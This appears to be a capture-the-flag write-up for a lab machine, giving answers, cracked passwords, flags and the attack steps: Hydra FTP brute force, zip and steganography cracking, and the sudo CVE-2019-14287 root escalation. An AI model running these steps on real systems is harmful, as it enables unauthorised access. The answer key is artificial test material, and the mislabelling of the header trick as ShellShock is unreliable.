export IP=10.10.131.250


==================================================

[TASK 2] - Enumerate

1) How many open ports?

	Answer: `3`
	Notes: See approach step 1

2) How you redirect yourself to a secret page?

	Answer: `User-Agent`

3) What is the agent name?

	Answer: `chris`
	Command: `curl -v -L -H "User-Agent: C" http://$IP -o task2-output1.txt`
	Notes: See approach step 3.


==================================================

[TASK 3] - Hash cracking and brute-force

1) FTP Password

	Answer: `crystal`
	Notes: See approach step 4

2) Zip file password

	Answer: `alien`
	Notes: See approach steps 7 & 8

3) steg password

	Answer: `Area51`
	Notes: See approach step 9

4) Who is the other agent (in full name)?

	Answer: `james`
	Notes: See approach step 9

5) SSH password

	Answer: `hackerrules`
	Notes: See approach step 9


==================================================

[TASK 4] - Capture the user flag

1) What is the user flag?

	Answer: `b03d975e8c92a7c04146cfa7a5a313c7`

2) What is the incident of the photo called?

	Answer: `ROSWELL ALIEN AUTOPSY`
	Notes:
		- Within james's home directory, there is an image called Alien_autospy.jpg. I googled it and found the answer.


==================================================

[TASK 4] - Privilege escalation

1) CVE number for the escalation

	Answer: `CVE-2019-14287`
	Notes:
		- Ran the command, `sudo -l`, and got the following response:
			User james may run the following commands on agent-sudo:
    			(ALL, !root) /bin/bash
    	- I googled '(ALL, !root) /bin/bash' and came across the exploit on exploit-db.

2) What is the root flag?

	Answer: `b53a02f55b57d4439e3341834d70c06`2
	Notes:
		- See approach step 10

3) (Bonus) Who is Agent R?

	Answer: `DesKel`


==================================================

[IMPORTANT INFORMATION]

FTP username: chris
FTP password: crystal

SSH username: james
SSH password: hackerrules | hackerrules!


==================================================

[APPROACH]

1) Run nmap:

	Command: `nmap -sC -sV -oN nmap/initial $IP`

2) Run gobuster:

	Command: `gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x py,sh,php,html -o gobuster.log`

3) The apache server is vulnerable to an exploit called ShellShock. More specifically, using curl, I can modify and mess with my request to the server using the header, User-Agent, as the index.php page hints at.

	Commands: 
		1) `curl -v -L -H "User-Agent: R" http://$IP -o task2-output1.txt` 
				> Created output file, 'task2-output1.txt'.
		2) `curl -v -L -H "User-Agent: C" http://$IP -o task2-output2.txt` 
				> Created output file, 'task2-output2.txt'.
	Notes:
		- Running the above command for User-Agent: R returns a message that hints that the other agent's names are a part of the alphabet. See file, task2-output1.txt.
		- Using this knowledge, I can check to see if any of the other agents have secret pages. Going to try the above curl command using each letter in the alphabet.
		- "User-Agent: C" worked! Was redirected here: 'http://$IP/agent_C_attention.php'. See file, 'task2-output2.txt'.

4) With the found username, chris, I'm going to try some Hydra to try to brute-force into the FTP server.

	Command: `hydra -l chris -P /usr/share/wordlists/rockyou.txt $IP ftp`
			> Found 'crystal' as the password.

5) Login to the FTP server with the found credentials:

	Command: `ftp $IP` + `chris` + `crystal`

6) Poked around the FTP server and found and downloaded some stuff to my local directory, `chris_ftp_files`.

7) Using steganography on the downloaded images:

	Commands:
		1) `binwalk -e cutie.png` 
				> Created a new folder, 'chris_ftp_files/_cutie.png.extracted'.
		2) `7a e 8702.zip` 
				> Didn't work because zip is password protected.
				> Came back to this command in step 8.
		3) `apt-get install fcrackzip` (to brute-force the zip password)
		4) `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 8702.zip`
				> Wasn't the solution.

8) JohnTheRipper on the ZIP file, '8702.zip', inside the 'chris_ftp_files/_cutie.png.extracted' folder:

	Commands:
		1) `zip2john 8702.zip > 8702.hash`
		2) `john 8702.hash`
		3) `john --show 8702.hash`
				> FOUND PASSWORD FOR ZIP FILE: 'alien'.
		4) `7z e 8702.zip` + `Y` + `alien`
				> Extracted the 'To_agentR.txt' file.
				> 'QXJlYTUx' was inside the text file.

9) Thinking I need to decode the `QXJlYTUx` string then use that as the steganography password to the 'chris_ftp_files/cute-alien.jpg' file:

	Commands:
		1) `echo 'QXJlYTUx' | base64 -d`
				> Yielded 'Area51'.
				> Trying 'Area51' as the steg password for the cute-alien.jpg file.
		2) `steghide extract -sf cute-alien.jpg`
				> Created a file, 'message.txt'.
		3) `cat message.txt`
				> Provided me with the other username, james, and password, hackerrules.

10) SSH into the machine and escalate privilege.

	Commands:
		1) `ssh james@$IP` + `hackerrules!`
		2) `sudo -l`
				> Returned: 'User james may run the following commands on agent-sudo:
    							(ALL, !root) /bin/bash'
    			> Seaching google, I found a CVE on (All, !root): 'CVE-2019-14287'.
    	3) `sudo -u#-1 /bin/bash`
    			> ROOT ACCESS.
